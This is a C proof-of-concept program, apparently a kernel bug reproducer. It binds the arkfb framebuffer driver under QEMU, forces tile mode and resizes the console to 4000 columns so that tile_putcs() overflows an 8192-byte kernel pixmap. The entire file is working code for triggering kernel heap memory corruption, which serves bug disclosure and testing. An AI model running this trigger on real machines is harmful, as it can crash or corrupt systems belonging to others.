// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <linux/fb.h>
#include <linux/kd.h>
#include <linux/vt.h>

#define XRES		4096
#define YRES		240
#define FONT_W		1
#define FONT_H		16
#define COLS		4000
#define ROWS		(YRES / FONT_H)

static int wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int r;

	if (fd < 0) {
		printf("[-] open %s: %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, val, strlen(val));
	if (r < 0)
		printf("[-] write %s: %s\n", path, strerror(errno));
	close(fd);
	return r;
}

static void show_var(int fb, const char *tag)
{
	struct fb_var_screeninfo v;

	if (ioctl(fb, FBIOGET_VSCREENINFO, &v) == 0)
		printf("[*] %s: %ux%u virt %ux%u bpp %u\n", tag, v.xres, v.yres,
		       v.xres_virtual, v.yres_virtual, v.bits_per_pixel);
}

static void show_cols(const char *tag, int vt)
{
	char path[32];
	struct winsize ws;
	int fd;

	snprintf(path, sizeof(path), "/dev/tty%d", vt);
	mknod(path, S_IFCHR | 0666, makedev(4, vt));
	fd = open(path, O_RDWR | O_NOCTTY);
	if (fd < 0)
		return;
	if (ioctl(fd, TIOCGWINSZ, &ws) == 0)
		printf("[*] %s %s: %u cols x %u rows\n", tag, path,
		       ws.ws_col, ws.ws_row);
	close(fd);
}

int main(void)
{
	int fb, tty;
	struct fb_var_screeninfo var;
	struct fb_fix_screeninfo fix;
	struct console_font_op op;
	struct vt_sizes sz;
	static unsigned char font[32 * 256];

	setvbuf(stdout, NULL, _IONBF, 0);
	wfile("/proc/sys/kernel/printk", "8 4 1 7\n");

	printf("[*] binding arkfb to the QEMU stdvga PCI function (1234:1111)\n");
	wfile("/sys/bus/pci/drivers/arkfb/new_id", "1234 1111");
	sleep(1);

	mknod("/dev/fb0", S_IFCHR | 0666, makedev(29, 0));
	fb = open("/dev/fb0", O_RDWR);
	if (fb < 0) {
		printf("[-] /dev/fb0: %s (arkfb did not bind)\n", strerror(errno));
		return 1;
	}
	if (ioctl(fb, FBIOGET_FSCREENINFO, &fix) == 0)
		printf("[+] fb0 = '%s', %u bytes VRAM\n", fix.id, fix.smem_len);

	mknod("/dev/tty1", S_IFCHR | 0666, makedev(4, 1));
	tty = open("/dev/tty1", O_RDWR | O_NOCTTY);
	if (tty < 0) {
		printf("[-] /dev/tty1: %s\n", strerror(errno));
		return 1;
	}

	memset(&var, 0, sizeof(var));
	if (ioctl(fb, FBIOGET_VSCREENINFO, &var) < 0) {
		printf("[-] FBIOGET_VSCREENINFO: %s\n", strerror(errno));
		return 1;
	}
	var.xres = var.xres_virtual = XRES;
	var.yres = var.yres_virtual = YRES;
	var.xoffset = var.yoffset = 0;
	var.bits_per_pixel = 8;
	var.grayscale = 0;
	var.nonstd = 0;
	memset(&var.red, 0, sizeof(var.red));
	memset(&var.green, 0, sizeof(var.green));
	memset(&var.blue, 0, sizeof(var.blue));
	memset(&var.transp, 0, sizeof(var.transp));
	var.pixclock = 39721;
	var.left_margin = 8;
	var.right_margin = 0;
	var.hsync_len = 8;
	var.upper_margin = 8;
	var.lower_margin = 8;
	var.vsync_len = 2;
	var.vmode = FB_VMODE_NONINTERLACED;
	var.activate = FB_ACTIVATE_NOW;
	if (ioctl(fb, FBIOPUT_VSCREENINFO, &var) < 0) {
		printf("[-] set %dx%d-8: %s\n", XRES, YRES, strerror(errno));
		return 1;
	}
	show_var(fb, "graphics mode");

	memset(font, 0xa5, sizeof(font));
	memset(&op, 0, sizeof(op));
	op.op = KD_FONT_OP_SET;
	op.width = FONT_W;
	op.height = FONT_H;
	op.charcount = 256;
	op.data = font;
	if (ioctl(tty, KDFONTOP, &op) < 0) {
		printf("[-] KDFONTOP %dx%d: %s\n", FONT_W, FONT_H, strerror(errno));
		return 1;
	}
	show_cols("after font", 1);

	if (ioctl(tty, KDSETMODE, KD_GRAPHICS) < 0) {
		printf("[-] KDSETMODE KD_GRAPHICS: %s\n", strerror(errno));
		return 1;
	}

	var.bits_per_pixel = 0;
	var.grayscale = 0;
	var.nonstd = 0;
	memset(&var.red, 0, sizeof(var.red));
	memset(&var.green, 0, sizeof(var.green));
	memset(&var.blue, 0, sizeof(var.blue));
	memset(&var.transp, 0, sizeof(var.transp));
	var.activate = FB_ACTIVATE_NOW;
	if (ioctl(fb, FBIOPUT_VSCREENINFO, &var) < 0) {
		printf("[-] set bpp=0 (tile mode): %s\n", strerror(errno));
		return 1;
	}
	show_var(fb, "tile mode");
	if (ioctl(fb, FBIOGET_FSCREENINFO, &fix) == 0)
		printf("[+] fix.type %u (3 == FB_TYPE_TEXT) line_length %u\n",
		       fix.type, fix.line_length);

	sz.v_rows = ROWS;
	sz.v_cols = COLS;
	sz.v_scrollsize = 0;
	if (ioctl(tty, VT_RESIZE, &sz) < 0)
		printf("[-] VT_RESIZE: %s\n", strerror(errno));
	show_cols("after resize", 1);

	printf("[*] KDSETMODE(KD_TEXT): repaint %d cols -> tile_putcs() writes "
	       "%d bytes into the 8192-byte pixmap\n", COLS, 4 * COLS);
	if (ioctl(tty, KDSETMODE, KD_TEXT) < 0)
		printf("[-] KDSETMODE KD_TEXT: %s\n", strerror(errno));

	sleep(2);
	printf("[*] no crash\n");
	return 0;
}
